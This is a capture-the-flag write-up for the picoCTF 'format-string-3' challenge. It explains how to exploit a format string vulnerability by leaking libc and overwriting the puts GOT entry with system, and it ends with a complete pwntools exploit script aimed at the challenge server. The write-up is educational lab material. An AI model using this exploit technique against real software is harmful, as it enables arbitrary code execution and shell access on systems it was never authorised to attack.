## Challenge Description

## Solution

Following files were provided:

```
format-string-3
format-string-3.c
libc.so.6
ld-linux-x86-64.so.2
```

Before starting, I want to say that I am not an expert when it comes to binary exploitation. If you find mistakes in my write-ups, please let me know. I am open to any sort of constructive criticism.

Source code provided to us:

```c:format-string-3.c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();

	fgets(buf, 1024, stdin);
	printf(buf);

	puts(normal_string);

	return 0;
}
```

The most interesting part in this code is:

```c
	puts(normal_string);
```

At the end of the main function, the parameter passed to the `puts` function (`normal_string`) contains the content "/bin/sh". If we can change this `puts` function into a system call, we can spawn a shell. This can be achieved by overwriting entries in the Global Offset Table (GOT), which is a table inside the binary that stores the memory addresses of different library calls. Let's take a look at it:

To overwrite GOT entry, we need to find the offset of our input string on the stack, offset of `setvbuf` from the libc base to calculate address of libc base (as the setvbuf is given).

First, lets find out the starting index, i will pass 8 â€˜Aâ€™ and will leak the addresses of the stack so that I can clearly see where the input is being stored:

```
AAAAAAAA|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|
```

Here I can see that my offset is `38`:

Now, as the address of `setvbuf` is given, we only need to calcluate the address of libc base. For that, I need to know the offset of setvbuf from the libc base. It can be found usingÂ `objdump`Â on the binary:

```bash:objdump-command
objdump -T ./libc.so.6 | grep "setvbuf"
```

This is how libc base address will be calculated:

```python
libc.address = <leaked_setvbuf_address> - 0x000000000007a3f0
```

For creating the payload, I took help from a Guide on **Format String Bug** written by [TheFlash2k](https://www.theflash2k.me/about).

He has also explain how to overwrite entries on the GOT. **[[Source](https://www.theflash2k.me/blog/ctf-techs/fsb-guide#overwriting-entries-on-the-global-offset-table)]**

So the final payload that I created:

```python:payload.py
#!/usr/bin/env python3
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

exe = "./format-string-3"
elf = context.binary = ELF(exe)
libc = ELF("./libc.so.6")

#io = process()
io = remote("rhea.picoctf.net", 52286)

if args.GDB: gdb.attach(io, "b *main+127") # gdb attachment

start = 38

io.recvuntil(b'setvbuf in libc: ')
leak = int(io.recvline().strip(), 16)
print("setvbuf @ %#x" % leak)

libc.address = leak - 0x000000000007a3f0
print("libc @ %#x" % libc.address)

payload = fmtstr_payload(start, {elf.sym.got.puts: libc.sym.system})

io.sendline(payload)
io.interactive()
```
